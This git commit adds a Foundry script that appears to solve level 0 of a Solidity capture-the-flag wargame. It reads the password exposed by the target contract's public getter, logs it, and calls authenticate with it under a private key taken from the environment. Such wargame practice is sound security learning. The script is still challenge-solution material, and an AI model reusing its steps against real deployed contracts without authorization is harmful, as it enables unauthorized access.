4daf5cc669c31820fce37cc0d524d0c93e6dbf03
Tushar Goyal <tushar456goyal@gmail.com>
2025-06-01 15:56:11 +0530

    Initial commit

---
+++ script/Level0Solution.s.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.0;
+
+import "../src/Level0.sol";
+import {Script} from "forge-std/Script.sol";
+import {console} from "forge-std/console.sol";
+
+contract Level0Solution is Script{
+
+    Level0 public level0; 
+
+    function run() external {
+        level0 = Level0(0x21DA1eD8419a0Cc7D68ab23637172fD6b4407b39);
+        string memory password = level0.password();
+        console.log("password: ", password);
+        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
+        level0.authenticate(password);
+        vm.stopBroadcast();
+    }
+
+}
